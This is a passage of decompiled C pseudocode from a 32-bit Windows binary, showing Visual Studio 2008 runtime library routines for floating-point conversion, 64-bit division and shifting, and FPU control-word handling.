    if (((param_2[1] & 0xfffff) == 0) && (uVar1 == 0)) {
      param_1[1] = 0;
      *param_1 = 0;
      goto LAB_0041945f;
    }
    uVar3 = uVar3 + 0x3c01;
    local_8 = 0;
  }
  else if (uVar3 == 0x7ff) {
    uVar3 = 0x7fff;
  }
  else {
    uVar3 = uVar3 + 0x3c00;
  }
  param_1[1] = uVar1 >> 0x15 | (param_2[1] & 0xfffff) << 0xb | local_8;
  *param_1 = uVar1 << 0xb;
  while (local_8 == 0) {
    uVar1 = param_1[1];
    uVar3 = uVar3 - 1;
    param_1[1] = uVar1 * 2 | *param_1 >> 0x1f;
    *param_1 = *param_1 * 2;
    local_8 = uVar1 * 2 & 0x80000000;
  }
  uVar4 = uVar4 | uVar3;
LAB_0041945f:
  *(ushort *)(param_1 + 2) = uVar4;
  return;
}



// Library Function - Single Match
//  __fltout2
// 
// Library: Visual Studio 2008 Release

STRFLT __cdecl __fltout2(_CRT_DOUBLE _Dbl,STRFLT _Flt,char *_ResultStr,size_t _SizeInBytes)

{
  int iVar1;
  errno_t eVar2;
  STRFLT p_Var3;
  short local_30;
  char local_2e;
  char local_2c [24];
  uint local_14;
  uint uStack_10;
  ushort uStack_c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  ___dtold(&local_14,(uint *)&_Dbl);
  iVar1 = __I10_OUTPUT(local_14,uStack_10,uStack_c,0x11,0,&local_30);
  _Flt->flag = iVar1;
  _Flt->sign = (int)local_2e;
  _Flt->decpt = (int)local_30;
  eVar2 = _strcpy_s(_ResultStr,_SizeInBytes,local_2c);
  if (eVar2 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  _Flt->mantissa = _ResultStr;
  p_Var3 = (STRFLT)___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return p_Var3;
}



// Library Function - Single Match
//  __alldvrm
// 
// Library: Visual Studio 2008 Release

undefined8 __alldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __aullshr
// 
// Library: Visual Studio 2008 Release

ulonglong __fastcall __aullshr(byte param_1,uint param_2)

{
  uint in_EAX;
  
  if (0x3f < param_1) {
    return 0;
  }
  if (param_1 < 0x20) {
    return CONCAT44(param_2 >> (param_1 & 0x1f),
                    in_EAX >> (param_1 & 0x1f) | param_2 << 0x20 - (param_1 & 0x1f));
  }
  return (ulonglong)(param_2 >> (param_1 & 0x1f));
}



// Library Function - Single Match
//  __controlfp_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __controlfp_s(uint *_CurrentState,uint _NewValue,uint _Mask)

{
  uint uVar1;
  int *piVar2;
  errno_t eVar3;
  
  uVar1 = _Mask & 0xfff7ffff;
  if ((_NewValue & uVar1 & 0xfcf0fce0) == 0) {
    if (_CurrentState == (uint *)0x0) {
      __control87(_NewValue,uVar1);
    }
    else {
      uVar1 = __control87(_NewValue,uVar1);
      *_CurrentState = uVar1;
    }
    eVar3 = 0;
  }
  else {
    if (_CurrentState != (uint *)0x0) {
      uVar1 = __control87(0,0);
      *_CurrentState = uVar1;
    }
    piVar2 = __errno();
    eVar3 = 0x16;
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return eVar3;
}



// Library Function - Single Match
//  int __cdecl _ValidateRead(void const *,unsigned int)
// 
// Library: Visual Studio 2008 Release

int __cdecl _ValidateRead(void *param_1,uint param_2)

{
  return (uint)(param_1 != (void *)0x0);
}



// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2008 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  uchar *puVar1;
  _LDBL12 *p_Var2;
  undefined4 uVar3;
  int iVar4;
  INTRNCVT_STATUS IVar5;
  int iVar6;
  byte bVar7;
  _LDBL12 **pp_Var8;
  _LDBL12 **pp_Var9;
  uint uVar10;
  undefined *puVar11;
  _LDBL12 *p_Var12;
  uint uVar13;
  int iVar14;
  int iVar15;
  bool bVar16;
  _LDBL12 *local_24 [2];
  int local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  _LDBL12 *local_8;
  
  local_18 = *(ushort *)(_Ifp->ld12 + 10) & 0x8000;
  p_Var2 = *(_LDBL12 **)(_Ifp->ld12 + 6);
  local_24[0] = p_Var2;
  uVar3 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar13 = *(ushort *)(_Ifp->ld12 + 10) & 0x7fff;
  iVar14 = uVar13 - 0x3fff;
  iVar4 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_24[1] = (_LDBL12 *)uVar3;
  local_1c = iVar4;
  if (iVar14 == -0x3fff) {
    iVar14 = 0;
    iVar4 = 0;
    do {
      if (local_24[iVar4] != (_LDBL12 *)0x0) {
        local_24[0] = (_LDBL12 *)0x0;
        local_24[1] = (_LDBL12 *)0x0;
        IVar5 = INTRNCVT_UNDERFLOW;
        goto LAB_00419b7e;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < 3);
    IVar5 = INTRNCVT_OK;
  }
  else {
    _Ifp = (_LDBL12 *)0x0;
    iVar15 = DAT_00423688 - 1;
    iVar6 = (int)(DAT_00423688 + ((int)DAT_00423688 >> 0x1f & 0x1fU)) >> 5;
    uVar10 = DAT_00423688 & 0x8000001f;
    local_14 = iVar14;
    local_10 = iVar6;
    if ((int)uVar10 < 0) {
      uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;
    }
    pp_Var9 = local_24 + iVar6;
    bVar7 = (byte)(0x1f - uVar10);
    local_c = 0x1f - uVar10;
    if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
      p_Var12 = (_LDBL12 *)((uint)local_24[iVar6] & ~(-1 << (bVar7 & 0x1f)));
      while( true ) {
        if (p_Var12 != (_LDBL12 *)0x0) {
          iVar6 = (int)(iVar15 + (iVar15 >> 0x1f & 0x1fU)) >> 5;
          local_8 = (_LDBL12 *)0x0;
          puVar11 = (undefined *)(1 << (0x1f - ((byte)iVar15 & 0x1f) & 0x1f));
          pp_Var8 = local_24 + iVar6;
          _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + (int)puVar11);
          if (_Ifp < *pp_Var8) goto LAB_004197b2;
          bVar16 = _Ifp < puVar11;
          do {
            local_8 = (_LDBL12 *)0x0;
            if (!bVar16) goto LAB_004197b9;
LAB_004197b2:
            do {
              local_8 = (_LDBL12 *)0x1;
LAB_004197b9:
              iVar6 = iVar6 + -1;
              *pp_Var8 = _Ifp;
              if ((iVar6 < 0) || (local_8 == (_LDBL12 *)0x0)) {
                _Ifp = local_8;
                goto LAB_004197c7;
              }
              local_8 = (_LDBL12 *)0x0;
              pp_Var8 = local_24 + iVar6;
              _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + 1);
            } while (_Ifp < *pp_Var8);
            bVar16 = _Ifp == (_LDBL12 *)0x0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        p_Var12 = local_24[iVar6];
      }
    }
LAB_004197c7:
    *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_c & 0x1f));
    iVar6 = local_10 + 1;
    if (iVar6 < 3) {
      pp_Var9 = local_24 + iVar6;
      for (iVar15 = 3 - iVar6; iVar15 != 0; iVar15 = iVar15 + -1) {
        *pp_Var9 = (_LDBL12 *)0x0;
        pp_Var9 = pp_Var9 + 1;
      }
    }
    if (_Ifp != (_LDBL12 *)0x0) {
      iVar14 = uVar13 - 0x3ffe;
    }
    if (iVar14 < (int)(DAT_00423684 - DAT_00423688)) {
      local_24[0] = (_LDBL12 *)0x0;
      local_24[1] = (_LDBL12 *)0x0;
    }
    else {
      if (DAT_00423684 < iVar14) {
        if (iVar14 < DAT_00423680) {
          local_24[0] = (_LDBL12 *)((uint)local_24[0] & 0x7fffffff);
          iVar14 = iVar14 + DAT_00423694;
          iVar4 = (int)(DAT_0042368c + ((int)DAT_0042368c >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_0042368c & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            local_14 = (uint)local_24[(int)_Ifp] & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] =
                 (_LDBL12 *)((uint)local_24[(int)_Ifp] >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar6 = 2;
          pp_Var9 = local_24 + (2 - iVar4);
          do {
            if (iVar6 < iVar4) {
              local_24[iVar6] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar6] = *pp_Var9;
            }
            iVar6 = iVar6 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar6);
          IVar5 = INTRNCVT_OK;
        }
        else {
          local_24[1] = (_LDBL12 *)0x0;
          local_1c = 0;
          local_24[0] = (_LDBL12 *)0x80000000;
          iVar14 = (int)(DAT_0042368c + ((int)DAT_0042368c >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_0042368c & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            p_Var2 = local_24[(int)_Ifp];
            local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar4 = 2;
          pp_Var9 = local_24 + (2 - iVar14);
          do {
            if (iVar4 < iVar14) {
              local_24[iVar4] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar4] = *pp_Var9;
            }
            iVar4 = iVar4 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar4);
          iVar14 = DAT_00423694 + DAT_00423680;
          IVar5 = INTRNCVT_OVERFLOW;
        }
        goto LAB_00419b7e;
      }
      local_14 = DAT_00423684 - local_14;
      local_24[0] = p_Var2;
      local_24[1] = (_LDBL12 *)uVar3;
      iVar14 = (int)(local_14 + ((int)local_14 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = local_14 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
      iVar4 = DAT_00423688 - 1;
      iVar14 = (int)(DAT_00423688 + ((int)DAT_00423688 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = DAT_00423688 & 0x8000001f;
      local_10 = iVar14;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      bVar7 = (byte)(0x1f - uVar13);
      pp_Var9 = local_24 + iVar14;
      local_14 = 0x1f - uVar13;
      if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
        p_Var2 = (_LDBL12 *)((uint)local_24[iVar14] & ~(-1 << (bVar7 & 0x1f)));
        while (p_Var2 == (_LDBL12 *)0x0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_0041996a;
          p_Var2 = local_24[iVar14];
        }
        iVar14 = (int)(iVar4 + (iVar4 >> 0x1f & 0x1fU)) >> 5;
        bVar16 = false;
        p_Var12 = (_LDBL12 *)(1 << (0x1f - ((byte)iVar4 & 0x1f) & 0x1f));
        p_Var2 = local_24[iVar14];
        puVar1 = p_Var12->ld12 + (int)p_Var2->ld12;
        if ((puVar1 < p_Var2) || (puVar1 < p_Var12)) {
          bVar16 = true;
        }
        local_24[iVar14] = (_LDBL12 *)puVar1;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar16))) {
          p_Var2 = local_24[iVar14];
          puVar1 = p_Var2->ld12 + 1;
          bVar16 = false;
          if ((puVar1 < p_Var2) || (puVar1 == (uchar *)0x0)) {
            bVar16 = true;
          }
          local_24[iVar14] = (_LDBL12 *)puVar1;
        }
      }
LAB_0041996a:
      *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_14 & 0x1f));
      iVar14 = local_10 + 1;
      if (iVar14 < 3) {
        pp_Var9 = local_24 + iVar14;
        for (iVar4 = 3 - iVar14; iVar4 != 0; iVar4 = iVar4 + -1) {
          *pp_Var9 = (_LDBL12 *)0x0;
          pp_Var9 = pp_Var9 + 1;
        }
      }
      uVar13 = DAT_0042368c + 1;
      iVar14 = (int)(uVar13 + ((int)uVar13 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = uVar13 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
    }
    iVar14 = 0;
    IVar5 = INTRNCVT_UNDERFLOW;
  }
LAB_00419b7e:
  uVar13 = iVar14 << (0x1fU - (char)DAT_0042368c & 0x1f) | -(uint)(local_18 != 0) & 0x80000000 |
           (uint)local_24[0];
  if (DAT_00423690 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar13;
    *(_LDBL12 **)&_D->x = local_24[1];
  }
  else if (DAT_00423690 == 0x20) {
    *(uint *)&_D->x = uVar13;
  }
  return IVar5;
}



// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2008 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  uchar *puVar1;
  _LDBL12 *p_Var2;
  undefined4 uVar3;
  int iVar4;
  INTRNCVT_STATUS IVar5;
  int iVar6;
  byte bVar7;
  _LDBL12 **pp_Var8;
  _LDBL12 **pp_Var9;
  uint uVar10;
  undefined *puVar11;
  _LDBL12 *p_Var12;
  uint uVar13;
  int iVar14;
  int iVar15;
  bool bVar16;
  _LDBL12 *local_24 [2];
  int local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  _LDBL12 *local_8;
  
  local_18 = *(ushort *)(_Ifp->ld12 + 10) & 0x8000;
  p_Var2 = *(_LDBL12 **)(_Ifp->ld12 + 6);
  local_24[0] = p_Var2;
  uVar3 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar13 = *(ushort *)(_Ifp->ld12 + 10) & 0x7fff;
  iVar14 = uVar13 - 0x3fff;
  iVar4 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_24[1] = (_LDBL12 *)uVar3;
  local_1c = iVar4;
  if (iVar14 == -0x3fff) {
    iVar14 = 0;
    iVar4 = 0;
    do {
      if (local_24[iVar4] != (_LDBL12 *)0x0) {
        local_24[0] = (_LDBL12 *)0x0;
        local_24[1] = (_LDBL12 *)0x0;
        IVar5 = INTRNCVT_UNDERFLOW;
        goto LAB_0041a0c2;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < 3);
    IVar5 = INTRNCVT_OK;
  }
  else {
    _Ifp = (_LDBL12 *)0x0;
    iVar15 = DAT_004236a0 - 1;
    iVar6 = (int)(DAT_004236a0 + ((int)DAT_004236a0 >> 0x1f & 0x1fU)) >> 5;
    uVar10 = DAT_004236a0 & 0x8000001f;
    local_14 = iVar14;
    local_10 = iVar6;
    if ((int)uVar10 < 0) {
      uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;
    }
    pp_Var9 = local_24 + iVar6;
    bVar7 = (byte)(0x1f - uVar10);
    local_c = 0x1f - uVar10;
    if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
      p_Var12 = (_LDBL12 *)((uint)local_24[iVar6] & ~(-1 << (bVar7 & 0x1f)));
      while( true ) {
        if (p_Var12 != (_LDBL12 *)0x0) {
          iVar6 = (int)(iVar15 + (iVar15 >> 0x1f & 0x1fU)) >> 5;
          local_8 = (_LDBL12 *)0x0;
          puVar11 = (undefined *)(1 << (0x1f - ((byte)iVar15 & 0x1f) & 0x1f));
          pp_Var8 = local_24 + iVar6;
          _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + (int)puVar11);
          if (_Ifp < *pp_Var8) goto LAB_00419cf6;
          bVar16 = _Ifp < puVar11;
          do {
            local_8 = (_LDBL12 *)0x0;
            if (!bVar16) goto LAB_00419cfd;
LAB_00419cf6:
            do {
              local_8 = (_LDBL12 *)0x1;
LAB_00419cfd:
              iVar6 = iVar6 + -1;
              *pp_Var8 = _Ifp;
              if ((iVar6 < 0) || (local_8 == (_LDBL12 *)0x0)) {
                _Ifp = local_8;
                goto LAB_00419d0b;
              }
              local_8 = (_LDBL12 *)0x0;
              pp_Var8 = local_24 + iVar6;
              _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + 1);
            } while (_Ifp < *pp_Var8);
            bVar16 = _Ifp == (_LDBL12 *)0x0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        p_Var12 = local_24[iVar6];
      }
    }
LAB_00419d0b:
    *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_c & 0x1f));
    iVar6 = local_10 + 1;
    if (iVar6 < 3) {
      pp_Var9 = local_24 + iVar6;
      for (iVar15 = 3 - iVar6; iVar15 != 0; iVar15 = iVar15 + -1) {
        *pp_Var9 = (_LDBL12 *)0x0;
        pp_Var9 = pp_Var9 + 1;
      }
    }
    if (_Ifp != (_LDBL12 *)0x0) {
      iVar14 = uVar13 - 0x3ffe;
    }
    if (iVar14 < (int)(DAT_0042369c - DAT_004236a0)) {
      local_24[0] = (_LDBL12 *)0x0;
      local_24[1] = (_LDBL12 *)0x0;
    }
    else {
      if (DAT_0042369c < iVar14) {
        if (iVar14 < DAT_00423698) {
          local_24[0] = (_LDBL12 *)((uint)local_24[0] & 0x7fffffff);
          iVar14 = iVar14 + DAT_004236ac;
          iVar4 = (int)(DAT_004236a4 + ((int)DAT_004236a4 >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_004236a4 & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            local_14 = (uint)local_24[(int)_Ifp] & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] =
                 (_LDBL12 *)((uint)local_24[(int)_Ifp] >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar6 = 2;
          pp_Var9 = local_24 + (2 - iVar4);
          do {
            if (iVar6 < iVar4) {
              local_24[iVar6] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar6] = *pp_Var9;
            }
            iVar6 = iVar6 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar6);
          IVar5 = INTRNCVT_OK;
        }
        else {
          local_24[1] = (_LDBL12 *)0x0;
          local_1c = 0;
          local_24[0] = (_LDBL12 *)0x80000000;
          iVar14 = (int)(DAT_004236a4 + ((int)DAT_004236a4 >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_004236a4 & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            p_Var2 = local_24[(int)_Ifp];
            local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar4 = 2;
          pp_Var9 = local_24 + (2 - iVar14);
          do {
            if (iVar4 < iVar14) {
              local_24[iVar4] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar4] = *pp_Var9;
            }
            iVar4 = iVar4 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar4);
          iVar14 = DAT_004236ac + DAT_00423698;
          IVar5 = INTRNCVT_OVERFLOW;
        }
        goto LAB_0041a0c2;
      }
      local_14 = DAT_0042369c - local_14;
      local_24[0] = p_Var2;
      local_24[1] = (_LDBL12 *)uVar3;
      iVar14 = (int)(local_14 + ((int)local_14 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = local_14 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
      iVar4 = DAT_004236a0 - 1;
      iVar14 = (int)(DAT_004236a0 + ((int)DAT_004236a0 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = DAT_004236a0 & 0x8000001f;
      local_10 = iVar14;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      bVar7 = (byte)(0x1f - uVar13);
      pp_Var9 = local_24 + iVar14;
      local_14 = 0x1f - uVar13;
      if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
        p_Var2 = (_LDBL12 *)((uint)local_24[iVar14] & ~(-1 << (bVar7 & 0x1f)));
        while (p_Var2 == (_LDBL12 *)0x0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_00419eae;
          p_Var2 = local_24[iVar14];
        }
        iVar14 = (int)(iVar4 + (iVar4 >> 0x1f & 0x1fU)) >> 5;
        bVar16 = false;
        p_Var12 = (_LDBL12 *)(1 << (0x1f - ((byte)iVar4 & 0x1f) & 0x1f));
        p_Var2 = local_24[iVar14];
        puVar1 = p_Var12->ld12 + (int)p_Var2->ld12;
        if ((puVar1 < p_Var2) || (puVar1 < p_Var12)) {
          bVar16 = true;
        }
        local_24[iVar14] = (_LDBL12 *)puVar1;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar16))) {
          p_Var2 = local_24[iVar14];
          puVar1 = p_Var2->ld12 + 1;
          bVar16 = false;
          if ((puVar1 < p_Var2) || (puVar1 == (uchar *)0x0)) {
            bVar16 = true;
          }
          local_24[iVar14] = (_LDBL12 *)puVar1;
        }
      }
LAB_00419eae:
      *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_14 & 0x1f));
      iVar14 = local_10 + 1;
      if (iVar14 < 3) {
        pp_Var9 = local_24 + iVar14;
        for (iVar4 = 3 - iVar14; iVar4 != 0; iVar4 = iVar4 + -1) {
          *pp_Var9 = (_LDBL12 *)0x0;
          pp_Var9 = pp_Var9 + 1;
        }
      }
      uVar13 = DAT_004236a4 + 1;
      iVar14 = (int)(uVar13 + ((int)uVar13 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = uVar13 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
    }
    iVar14 = 0;
    IVar5 = INTRNCVT_UNDERFLOW;
  }
LAB_0041a0c2:
  uVar13 = iVar14 << (0x1fU - (char)DAT_004236a4 & 0x1f) | -(uint)(local_18 != 0) & 0x80000000 |
           (uint)local_24[0];
  if (DAT_004236a8 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar13;
    *(_LDBL12 **)&_D->x = local_24[1];
  }
  else if (DAT_004236a8 == 0x20) {
    *(uint *)&_D->x = uVar13;
  }
  return IVar5;
}



// WARNING: Removing unreachable block (ram,0x0041a3c7)
// WARNING: Removing unreachable block (ram,0x0041a390)
// WARNING: Removing unreachable block (ram,0x0041a778)
// WARNING: Removing unreachable block (ram,0x0041a39f)
// WARNING: Removing unreachable block (ram,0x0041a3a7)
